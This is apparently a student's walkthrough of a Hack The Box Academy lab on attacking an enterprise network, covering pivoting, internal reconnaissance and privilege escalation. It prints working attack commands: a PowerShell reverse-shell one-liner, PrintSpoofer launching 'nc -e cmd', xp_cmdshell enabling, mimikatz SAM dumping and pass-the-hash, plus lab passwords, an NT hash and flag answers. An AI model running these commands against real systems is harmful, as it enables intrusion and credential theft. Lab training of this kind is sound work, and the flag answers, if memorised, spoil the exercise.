# [Attacking Enterprise Networks](https://academy.hackthebox.com/module/details/163)

## Table of Contents

- [x] Internal Testing
	- [x] Post-Exploitation Persistence
	- [x] Internal Information Gathering
	- [x] Exploitation and Privilege Escalation

---
---

## Internal Testing

> Now that we've worked so hard to obtain this foothold, we don't want to lose it. The goal is to use this host as a pivot point to access the rest of the internal network. Our shell is still relatively unstable, and we don't want to keep setting up our access with multiple steps because we want to be as efficient as possible and spend as much time on the actual assessment, not fiddling around with shells.

### Post-Exploitation Persistence

> Now that we have credentials (`srvadm:ILFreightnixadm!`), we can leverage the SSH port we saw open earlier and connect in for a stable connection. This is important because we want to be able to get back as close as possible to the same spot at the start of testing each day, so we don't have to waste time on setup. Now we won't always have SSH open to the internet and may have to achieve persistence another way. We could create a reverse shell binary on the host, execute it via the command injection, get a reverse shell or Meterpreter shell, and then work through that. Since SSH is here, we'll use it. There are many ways to pivot and tunnel our traffic, so it's worth trying out some of them in this section to get extra practice.

Questions:
1. Escalate privileges on the target host and submit the contents of the `flag.txt` file in the `/root` directory. `a3498***************************`

```yaml
credentials:
    username: srvadm
    password: 'ILFreightnixadm!'
    host: inlanefreight.local
    port: 22 (SSH)
```

```
┌──(nabla㉿kali)-[~]
└─$ ssh srvadm@inlanefreight.local

srvadm@inlanefreight.local's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-113-generic x86_64)

[SNIP]

$ bash -i
srvadm@dmz01:~$
```

```
srvadm@dmz01:~$ id

uid=1003(srvadm) gid=1003(srvadm) groups=1003(srvadm)
```

```
srvadm@dmz01:~$ sudo -l

[SNIP]

User srvadm may run the following commands on dmz01:
    (ALL) NOPASSWD: /usr/bin/openssl
```

![Firefox - GTFOBins openssl File Read](./assets/screenshots/attacking_enterprise_networks_internal_testing_01.png)

```
srvadm@dmz01:~$ LFILE=/root/.ssh/id_rsa; sudo openssl enc -in "$LFILE"

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA0ksXgILHRb0j1s3pZH8s/EFYewSeboEi4GkRogdR53GWXep7GJMI
oxuXTaYkMSFG9Clij1X6crkcWLnSLuKI8KS5qXsuNWISt+T1bpvTfmFymDIWNx4efR/Yoa

[SNIP]
```

```
┌──(nabla㉿kali)-[~]
└─$ vim root_ssh_sk

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA0ksXgILHRb0j1s3pZH8s/EFYewSeboEi4GkRogdR53GWXep7GJMI
oxuXTaYkMSFG9Clij1X6crkcWLnSLuKI8KS5qXsuNWISt+T1bpvTfmFymDIWNx4efR/Yoa

[SNIP]
```

```
┌──(nabla㉿kali)-[~]
└─$ chmod 600 root_ssh_sk
```

```
┌──(nabla㉿kali)-[~]
└─$ ssh -i root_ssh_sk root@inlanefreight.local

[SNIP]

Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-113-generic x86_64)

root@dmz01:~# 
```

```
root@dmz01:~# id

uid=0(root) gid=0(root) groups=0(root)
```

```
root@dmz01:~# root@dmz01:~# cat /root/flag.txt

a3498*************************** 📌
```

---

### Internal Information Gathering

> With a copy of the root `id_rsa` (private key) file, we can use SSH port forwarding along with [ProxyChains](https://github.com/haad/proxychains) to start getting a picture of the internal network.

Questions:
1. Mount an NFS share and find a `flag.txt` file. Submit the contents as your answer. `bf22a***************************`

```
root@dmz01:~# ifconfig | grep -w inet -B1

--
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.69.184  netmask 255.255.0.0  broadcast 10.129.255.255
--
ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.8.120  netmask 255.255.0.0  broadcast 172.16.255.255
```

```
root@dmz01:~# for i in $(seq 1 254); do (ping -c 1 172.16.8.$i | grep "bytes from" &); done

64 bytes from 172.16.8.3: icmp_seq=1 ttl=128 time=2.81 ms
64 bytes from 172.16.8.20: icmp_seq=1 ttl=128 time=5.57 ms
64 bytes from 172.16.8.50: icmp_seq=1 ttl=128 time=1.40 ms
64 bytes from 172.16.8.120: icmp_seq=1 ttl=64 time=0.027 ms
```

```
root@dmz01:~# ./nmap -Pn -sS -p- 172.16.8.3 172.16.8.20 172.16.8.50 -T4

[SNIP]

Nmap scan report for 172.16.8.3

PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos
135/tcp   open  epmap
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd
593/tcp   open  unknown
636/tcp   open  ldaps
3268/tcp  open  unknown
3269/tcp  open  unknown
5985/tcp  open  unknown

[SNIP]

Nmap scan report for 172.16.8.20

PORT      STATE SERVICE
80/tcp    open  http
111/tcp   open  sunrpc
135/tcp   open  epmap
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
2049/tcp  open  nfs
3389/tcp  open  ms-wbt-server
5985/tcp  open  unknown

[SNIP]

Nmap scan report for 172.16.8.50

PORT      STATE SERVICE
135/tcp   open  epmap
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5985/tcp  open  unknown
8080/tcp  open  http-alt
```

```
┌──(nabla㉿kali)-[~]
└─$ grep socks4 /etc/proxychains.conf

#	 	socks4	192.168.1.49	1080
#       proxy types: http, socks4, socks5, raw
socks4 	127.0.0.1 9050
```

```
┌──(nabla㉿kali)-[~]
└─$ ssh -i root_ssh_sk root@inlanefreight.local -D 9050
```

```
┌──(nabla㉿kali)-[~]
└─$ sudo netstat -antp | grep ':9050'

tcp        0      0 127.0.0.1:9050          0.0.0.0:*               LISTEN      39834/ssh           
tcp6       0      0 ::1:9050                :::*                    LISTEN      39834/ssh
```

```
┌──(nabla㉿kali)-[~]
└─$ sudo proxychains netexec smb 172.16.8.3 172.16.8.20 172.16.8.50

[SNIP]

SMB         172.16.8.50     445    ACADEMY-AEN-MS0  [*] Windows 10 / Server 2019 Build 17763 x64 (name:ACADEMY-AEN-MS0) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.8.3      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [*] Windows 10 / Server 2019 Build 17763 x64 (name:ACADEMY-AEN-DEV) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
```

```
┌──(nabla㉿kali)-[~]
└─$ echo -e '172.16.8.3\tDC01.INLANEFREIGHT.LOCAL\n172.16.8.20\tACADEMY-AEN-DEV.INLANEFREIGHT.LOCAL\n172.16.8.50\tACADEMY-AEN-MS0.INLANEFREIGHT.LOCAL' | sudo tee -a /etc/hosts

172.16.8.3	DC01.INLANEFREIGHT.LOCAL
172.16.8.20	ACADEMY-AEN-DEV.INLANEFREIGHT.LOCAL
172.16.8.50	ACADEMY-AEN-MS0.INLANEFREIGHT.LOCAL
```

```
┌──(nabla㉿kali)-[~]
└─$ sudo proxychains -q showmount -e 172.16.8.20

Export list for 172.16.8.20:
/DEV01 (everyone)
```

```
root@dmz01:~# mkdir /tmp/DEV01 && sudo mount -t nfs 172.16.8.20:/DEV01 /tmp/DEV01/
```

```
root@dmz01:~# tree /tmp/DEV01

/tmp/DEV01
├── BuildPackages.bat
├── CKEditorDefaultSettings.xml
├── CKToolbarButtons.xml
├── CKToolbarSets.xml
├── DNN

[SNIP]

│   ├── WatchersNET.CKEditor.csproj
│   ├── Web
│   │   └── CKEditorControl.cs
│   ├── web.config
│   ├── web.Debug.config
│   ├── web.Deploy.config
│   └── web.Release.config
├── flag.txt
└── WatchersNET.CKEditor.sln
```

```
root@dmz01:~# cat /tmp/DEV01/flag.txt

bf22a*************************** 📌
```

```
root@dmz01:~# cat /tmp/DEV01/DNN/web.config

<?xml version="1.0"?>
<configuration>
  <!--
    For a description of web.config changes see http://go.microsoft.com/fwlink/?LinkId=235367.

    The following attributes can be set on the <httpRuntime> tag.
      <system.Web>
        <httpRuntime targetFramework="4.6.2" />
      </system.Web>
  -->
  <username>Administrator</username>
  <password>
	<value>D0tn31Nuk3R0ck$$@123</value>
  </password>
  <system.web>
    <compilation debug="true" targetFramework="4.5.2"/>
    <httpRuntime targetFramework="4.5.2"/>
  </system.web>
</configuration>
```

```
┌──(nabla㉿kali)-[~]
└─$ sudo proxychains -q whatweb http://172.16.8.20:80/

http://172.16.8.20:80/ [200 OK] ASP_NET[ViewState Encrypted], Bootstrap, Cookies[.ASPXANONYMOUS,__RequestVerificationToken,dnn_IsMobile,language], Country[RESERVED][ZZ], DotNetNuke, HTML5, HttpOnly[.ASPXANONYMOUS,__RequestVerificationToken,dnn_IsMobile,language], IP[172.16.8.20], JQuery, Script[text/javascript], Title[Home][Title element contains newline(s)!], X-Frame-Options[SAMEORIGIN], X-UA-Compatible[IE=edge], X-XSS-Protection[1; mode=block]
```

```
┌──(nabla㉿kali)-[~]
└─$ firefox http://172.16.8.20:80/ &
```

![Firefox - Proxy Settings](./assets/screenshots/attacking_enterprise_networks_internal_testing_02.png)

![Firefox - DotNetNuke (DNN) Homepage](./assets/screenshots/attacking_enterprise_networks_internal_testing_03.png)

![Firefox - DotNetNuke (DNN) Login 1](./assets/screenshots/attacking_enterprise_networks_internal_testing_04.png)

```yaml
credentials:
    username: Administrator
    password: 'D0tn31Nuk3R0ck$$@123'
    host: 172.16.8.20
    port: 80 (HTTP)
```

---

### Exploitation and Privilege Escalation

> Let's head over to DNN and try our luck with the credential pair `Administrator:D0tn31Nuk3R0ck$$@123`. This is a success; we are logged in as the SuperUser administrator account.

Questions:
1. Retrieve the contents of the SAM database on the `DEV01` host. Submit the NT hash of the administrator user as your answer. `0e20798f695ab0d04bc138b22344cea8`
2. Escalate privileges on the DEV01 host. Submit the contents of the `flag.txt` file on the `Administrator` Desktop. `K33p_************`

![Firefox - DotNetNuke (DNN) SQL Console 1](./assets/screenshots/attacking_enterprise_networks_internal_testing_05.png)

```sql
EXEC sp_configure 'show advanced options', '1';
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', '1';
RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

![Firefox - DotNetNuke (DNN) SQL Console 2](./assets/screenshots/attacking_enterprise_networks_internal_testing_06.png)

![Firefox - DotNetNuke (DNN) Allowable File Extensions 1](./assets/screenshots/attacking_enterprise_networks_internal_testing_07.png)

![Firefox - DotNetNuke (DNN) Allowable File Extensions 2](./assets/screenshots/attacking_enterprise_networks_internal_testing_08.png)

![Firefox - DotNetNuke (DNN) File Management](./assets/screenshots/attacking_enterprise_networks_internal_testing_09.png)

![Firefox - DotNetNuke (DNN) Web Shell](./assets/screenshots/attacking_enterprise_networks_internal_testing_10.png)

```
root@dmz01:~# nc -lvnp 1337

Listening on 0.0.0.0 1337

[CONTINUE]
```

```powershell
powershell /c "$client = New-Object System.Net.Sockets.TCPClient('172.16.8.120',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

```
[CONTINUE]

Listening on 0.0.0.0 1337
Connection received on 172.16.8.20 49985

PS C:\windows\system32\inetsrv> 
```

```
PS C:\windows\system32\inetsrv> whoami
iis apppool\dotnetnukeapppool
```

```
PS C:\windows\system32\inetsrv> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 

[SNIP]
```

```
root@dmz01:~# nc -lvnp 7331

Listening on 0.0.0.0 7331

[CONTINUE]
```

```
PS C:\windows\system32\inetsrv> c:\users\public\PrintSpoofer64.exe -c "c:\users\public\nc.exe 172.16.8.120 7331 -e cmd"
```

```
[CONTINUE]

Connection received on 172.16.8.20 50085
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

```
C:\Windows\system32> whoami

nt authority\system
```

```
C:\Windows\system32> type c:\users\administrator\desktop\flag.txt

K33p_************ 📌
```

```
C:\Windows\system32> c:\users\public\mimikatz.exe "token::elevate" "lsadump::sam" "exit"

[SNIP]

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 0e20798f695ab0d04bc138b22344cea8 📌
```

```
┌──(nabla㉿kali)-[~]
└─$ sudo proxychains -q netexec smb 172.16.8.20 -u administrator -H '0e20798f695ab0d04bc138b22344cea8' --local-auth

[SNIP]

SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [+] ACADEMY-AEN-DEV\administrator:0e20798f695ab0d04bc138b22344cea8 (Pwn3d!)
```

```yaml
credentials:
    username: administrator
    NTLM: '0e20798f695ab0d04bc138b22344cea8'
    host: 172.16.8.20
    port: 445 (SMB)
```

---
---
